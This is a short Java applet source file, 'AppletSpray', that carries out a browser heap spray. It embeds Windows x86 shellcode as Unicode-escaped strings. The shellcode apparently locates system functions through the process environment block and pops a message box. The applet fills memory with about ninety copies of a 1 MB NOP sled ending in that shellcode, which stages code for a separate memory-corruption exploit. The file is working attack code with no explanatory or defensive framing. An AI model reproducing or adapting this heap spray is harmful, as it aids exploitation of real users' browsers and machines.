import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet {
		public void init(){
			  
String shellcode=  "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                  "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                  "\u7568\u6573\u5472\uD233\u8b64\u305a\u4b8b\u8b0c" +
                  "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                  "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                  "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                  "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                  "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                  "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                  "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                  "\uff53\ufc57\uff53\uf857";
                   String[] mem=new String[1024];
		     StringBuffer buffer=new StringBuffer(0x100000/2);
                   //header(12 bytes) nop(0x100000-12-2-x) shellcode(x) NULL(2)
                  for(int i=0;i<(0x100000-14)/2-shellcode.length();i++)
                       buffer.append('\u9090');
                  buffer.append(shellcode);
                  Runtime.getRuntime().gc();
                  for(int j=0;j<90;j++)
                    mem[j] += buffer.toString();
		     
   }
}